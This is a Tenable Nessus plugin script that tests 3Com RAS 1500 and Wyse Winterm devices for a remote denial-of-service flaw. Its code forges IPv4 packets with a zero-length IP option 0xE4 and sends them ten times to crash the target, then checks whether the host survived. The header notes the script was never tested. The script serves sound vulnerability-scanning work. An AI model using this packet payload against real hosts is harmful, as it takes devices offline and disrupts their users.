#
# (C) Tenable Network Security, Inc.
#
# THIS SCRIPT WAS NOT TESTED !
# (will only work with Nessus >= 2.0.2 though, because of a bug in insert_ip_option())
#
# Ref:
#
# Date: Mon, 24 Mar 2003 16:56:21 +0100 (CET)
# From: Piotr Chytla <pch@isec.pl>
# Reply-To: iSEC Security Research <security@isec.pl>
# To: bugtraq@securityfocus.com, <vulnwatch@vulnwatch.org>
#
# Josh Zlatin-Amishav has also discovered that this affects 
# Wyse Winterm 1125SE thin client devices:
#    http://www.securityfocus.com/archive/1/407903/30/0/threaded



include("compat.inc");

if(description)
{
 script_id(11475);
 script_cve_id("CVE-2005-2577", "CVE-2006-0309");
 script_bugtraq_id(7175, 14536);
 script_version ("$Revision: 1.13 $");
 script_xref(name:"OSVDB", value:"18698");
 script_xref(name:"OSVDB", value:"22514");
 script_xref(name:"OSVDB", value:"50431");
 
 script_name(english:"3com RAS 1500 / Wyse Winterm Malformed Packet Remote DoS");
 script_summary(english:"Crashes a 3com_RAS_1500");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is vulnerable to a remote denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote host by sending a specially
crafted IP packet with a null length for IP option #0xE4

An attacker may use this flaw to prevent the remote host from
accomplishing its job properly.");

 script_set_attribute(attribute:"see_also", value:
"http://archive.cert.uni-stuttgart.de/bugtraq/2003/03/msg00321.html" );
 
 script_set_attribute(attribute:"solution", value:
"The solution is unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );


script_end_attributes();

 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_require_keys("Settings/ParanoidReport"); 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

  if ( TARGET_IS_IPV6 ) exit(0);
  if ( report_paranoia < 2 ) exit(0);
  start_denial();

  ip = forge_ip_packet(ip_hl: 5, ip_v : 4, ip_tos : 0,
  ip_len : 44, ip_id:1234, ip_off : 0,
  ip_ttl : 0xff, ip_p:0xAA,
  ip_src : this_host());

  ipo = insert_ip_options(ip:ip, code:0xE4, length:0, value:raw_string(0x00, 0x00));
  ipo += string("ABCDEFGHIJKLMNOPRSTU");
  send_packet(ipo, pcap_active:FALSE) x 10;
  sleep(5);
  alive = end_denial();
  if(!alive){
  security_hole(0);
  set_kb_item(name:"Host/dead", value:TRUE);
}
